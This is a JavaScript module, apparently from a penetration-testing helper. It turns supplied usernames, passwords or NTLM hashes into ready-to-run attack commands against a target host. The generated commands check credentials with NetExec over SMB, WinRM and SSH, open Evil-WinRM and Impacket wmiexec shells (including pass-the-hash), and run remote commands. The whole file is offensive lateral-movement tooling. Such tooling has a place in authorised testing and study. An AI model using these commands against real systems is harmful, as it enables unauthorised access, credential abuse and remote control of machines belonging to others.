const shellQuote = (value) => `'${String(value).replaceAll("'", "'\"'\"'")}'`;

const credentialCandidates = (accounts, variables) => [
  {
    id: "command-context",
    domain: variables.domain,
    username: variables.user,
    secret: variables.password?.trim() || variables.hash?.trim(),
  },
  ...accounts,
];

export function buildRemoteAccessCommands(accounts = [], variables = {}) {
  const commands = [];
  const seen = new Set();

  for (const account of credentialCandidates(accounts, variables)) {
    const username = account.username?.trim();
    const secret = account.secret?.trim();
    const domain = account.domain?.trim() ?? "";
    if (!username || !secret) continue;

    const dedupeKey = `${domain.toLowerCase()}\u0000${username.toLowerCase()}\u0000${secret}`;
    if (seen.has(dedupeKey)) continue;
    seen.add(dedupeKey);

    const identity = domain ? `${domain}\\${username}` : username;
    const key = account.id ?? `${domain}-${username}`;
    const userArg = shellQuote(username);
    const secretArg = shellQuote(secret);
    const domainArg = domain ? ` -d ${shellQuote(domain)}` : "";
    const isHash = /^[a-f0-9]{32}$/i.test(secret);
    const nxcAuth = isHash ? `-u ${userArg} -H ${secretArg}` : `-u ${userArg} -p ${secretArg}`;
    const evilAuth = isHash ? `-u ${userArg} -H ${secretArg}` : `-u ${userArg} -p ${secretArg}`;
    const principal = domain ? `${domain}/${username}` : username;

    commands.push(
      {
        key: `remote-validate-smb-${key}`,
        label: `Validate SMB authentication — ${identity}`,
        value: `nxc smb {{rhost}}${domainArg} ${nxcAuth}`,
      },
      {
        key: `remote-validate-winrm-${key}`,
        label: `Validate WinRM authentication — ${identity}`,
        value: `nxc winrm {{rhost}}${domainArg} ${nxcAuth}`,
      },
    );
    if (!isHash) {
      commands.push({
        key: `remote-validate-ssh-${key}`,
        label: `Validate SSH authentication — ${identity}`,
        value: `nxc ssh {{rhost}} -u ${userArg} -p ${secretArg}`,
      });
    }

    commands.push(
      {
        key: `remote-winrm-http-${key}`,
        label: `Open Evil-WinRM HTTP shell after confirming 5985 — ${identity}`,
        value: `evil-winrm -i {{rhost}} ${evilAuth}`,
      },
      {
        key: `remote-winrm-https-${key}`,
        label: `Open Evil-WinRM HTTPS shell after confirming 5986 — ${identity}`,
        value: `evil-winrm -i {{rhost}} ${evilAuth} -S -P 5986`,
      },
    );

    commands.push({
      key: `remote-nxc-exec-${key}`,
      label: `NetExec SMB command (admin / Pwn3d only) — ${identity}`,
      value: `nxc smb {{rhost}}${domainArg} ${nxcAuth} -x 'whoami && hostname && ipconfig'`,
    });

    commands.push({
      key: `remote-wmi-${key}`,
      label: `Open Impacket WMI shell (admin only) — ${identity}`,
      value: isHash
        ? `impacket-wmiexec -hashes ${shellQuote(`:${secret}`)} ${shellQuote(`${principal}@{{rhost}}`)}`
        : `impacket-wmiexec ${shellQuote(`${principal}:${secret}@{{rhost}}`)}`,
    });

    if (!isHash) {
      commands.push({
        key: `remote-ssh-${key}`,
        label: `Open SSH shell if port 22 is available — ${identity}`,
        value: `ssh -o PreferredAuthentications=password ${shellQuote(`${username}@{{rhost}}`)}`,
      });
    }
  }

  return commands;
}
